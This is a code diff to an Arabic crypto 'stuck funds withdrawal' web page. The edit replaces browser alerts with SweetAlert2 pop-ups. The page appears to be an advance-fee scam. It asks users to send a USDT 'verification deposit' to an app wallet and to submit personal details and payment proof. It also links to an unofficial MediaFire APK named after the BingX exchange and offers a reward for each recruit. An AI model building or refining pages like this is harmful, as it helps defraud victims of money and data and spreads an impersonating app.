@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>إيداع التحقق - سحب الأموال العالقة</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 <style>
 :root{
   --bg-gradient: linear-gradient(135deg,#0f2027,#203a43);
@@ -182,7 +183,14 @@ document.getElementById('locked-funds-file').addEventListener('change', e=>{
 
 function copyAppWallet(){
   const wallet = document.getElementById('app-wallet').value;
-  if(wallet) navigator.clipboard.writeText(wallet).then(()=>alert('تم نسخ محفظة التطبيق'));
+  if(wallet) navigator.clipboard.writeText(wallet).then(()=>{
+    Swal.fire({
+      icon:'success',
+      title:'تم النسخ',
+      text:'تم نسخ محفظة التطبيق بنجاح',
+      confirmButtonText:'حسناً'
+    });
+  });
 }
 
 function checkDeposit(){
@@ -198,9 +206,20 @@ function checkDeposit(){
 function submitVerificationDeposit(){
   const file = document.getElementById('proof-file').files[0];
   const amt = parseFloat(document.getElementById('verify-deposit-amount').value);
-  if(isNaN(amt)||amt<=0){alert('أدخل المبلغ'); return;}
-  if(!file){alert('يرجى إرفاق إثبات الدفع'); return;}
-  alert(`تم إرسال طلب التحقق لمبلغ ${amt} USDT بنجاح، قيد المراجعة.`);
+  if(isNaN(amt)||amt<=0){
+    Swal.fire({icon:'warning',title:'خطأ',text:'أدخل المبلغ'});
+    return;
+  }
+  if(!file){
+    Swal.fire({icon:'error',title:'تنبيه',text:'يرجى إرفاق إثبات الدفع'});
+    return;
+  }
+  Swal.fire({
+    icon:'success',
+    title:'تم الإرسال',
+    text:`تم إرسال طلب التحقق لمبلغ ${amt} USDT بنجاح، قيد المراجعة.`,
+    confirmButtonText:'موافق'
+  });
 }
 
 function requestWithdraw(){
@@ -211,17 +230,35 @@ function requestWithdraw(){
   const wallet = document.getElementById('withdraw-target-wallet').value.trim();
   const lockedFile = document.getElementById('locked-funds-file').files[0];
 
-  if(!name||!ref||!email){alert('يرجى تعبئة جميع البيانات'); return;}
-  if(isNaN(amt)||amt<=0){alert('أدخل مبلغ سحب صالح'); return;}
-  if(!wallet){alert('أدخل عنوان محفظتك'); return;}
-  if(!lockedFile){alert('يرجى رفع صورة الأموال العالقة'); return;}
-  alert(`تم تقديم طلب السحب بنجاح بمبلغ ${amt} USDT`);
+  if(!name||!ref||!email){
+    Swal.fire({icon:'warning',title:'خطأ',text:'يرجى تعبئة جميع البيانات'}); return;
+  }
+  if(isNaN(amt)||amt<=0){
+    Swal.fire({icon:'warning',title:'خطأ',text:'أدخل مبلغ سحب صالح'}); return;
+  }
+  if(!wallet){
+    Swal.fire({icon:'warning',title:'خطأ',text:'أدخل عنوان محفظتك'}); return;
+  }
+  if(!lockedFile){
+    Swal.fire({icon:'warning',title:'خطأ',text:'يرجى رفع صورة الأموال العالقة'}); return;
+  }
+  Swal.fire({
+    icon:'success',
+    title:'تم الطلب',
+    text:`تم تقديم طلب السحب بنجاح بمبلغ ${amt} USDT`,
+    confirmButtonText:'موافق'
+  });
 }
 
 function shareApp(){
   const url='https://www.mediafire.com/file/7fi3cvqggr9d2fg/BingX+Pro+V2.0.apk/file';
   window.open(url,'_blank');
-  alert('تم تحويلك لمشاركة التطبيق، ستحصل على خصم 10$ لكل شخص ينضم');
+  Swal.fire({
+    icon:'info',
+    title:'تم التحويل',
+    text:'تم تحويلك لمشاركة التطبيق، ستحصل على خصم 10$ لكل شخص ينضم',
+    confirmButtonText:'تمام'
+  });
 }
 </script>
 </body>
